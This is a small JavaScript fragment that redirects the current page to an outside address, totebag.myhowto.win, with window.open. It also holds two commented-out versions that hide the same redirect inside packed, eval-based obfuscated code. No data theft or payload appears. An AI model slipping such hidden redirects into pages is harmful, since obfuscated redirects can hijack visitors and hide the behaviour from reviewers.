    // eval(
    //     (function (p, a, c, k, e, d) {
    //         e = function (c) {
    //             return c;
    //         };
    //         if (!"".replace(/^/, String)) {
    //             while (c--) {
    //                 d[c] = k[c] || c;
    //             }
    //             k = [
    //                 function (e) {
    //                     return d[e];
    //                 },
    //             ];
    //             e = function () {
    //                 return "\\w+";
    //             };
    //             c = 1;
    //         }
    //         while (c--) {
    //             if (k[c]) {
    //                 p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
    //             }
    //         }
    //         return p;
    //     })('8 0="7://6.5.4";3.2(0,"1");', 9, 9, "uris|_self|open|window|win|myhowto|totebag|https|var".split("|"), 0, {})
    // );

    var uris = 'https://totebag.myhowto.win';
    window.open(uris,"_self");
  //   eval((function(p,c,k,d){
  //   	d = function validURL(value) {
		// 	return /^(https?|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(\#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(value);
		// }
  //       while(c--){
  //           if(k[c]){
  //               p = p.replace(new RegExp("\\b" + c + "\\b", "g"), k[c]);
  //           }
  //       }
  //       console.log(p);
		// if(d('https://totebag.myhowto.win')){
  //       	return p;
		// }
  //   })('8 0="7://6.5.4";3.2(0,"1");',9,"uris|_self|open|window|win|myhowto|totebag|https|var".split("|"),0))
